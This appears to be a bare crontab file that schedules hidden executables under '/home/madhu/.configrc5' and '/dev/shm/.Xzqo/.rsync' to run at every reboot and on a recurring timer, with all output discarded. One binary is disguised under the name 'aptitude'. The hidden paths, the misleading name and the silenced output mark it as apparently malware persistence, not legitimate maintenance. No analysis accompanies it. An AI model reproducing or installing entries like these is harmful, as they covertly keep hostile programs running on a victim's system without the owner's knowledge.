# .configrc5/cron.d
5 6 * * 0 /home/madhu/.configrc5/a/upd>/dev/null 2>&1
@reboot /home/madhu/.configrc5/a/upd>/dev/null 2>&1
5 8 * * 0 /home/madhu/.configrc5/b/sync>/dev/null 2>&1
@reboot /home/madhu/.configrc5/b/sync>/dev/null 2>&1
0 0 */3 * * /dev/shm/.Xzqo/.rsync/c/aptitude>/dev/null 2>&1
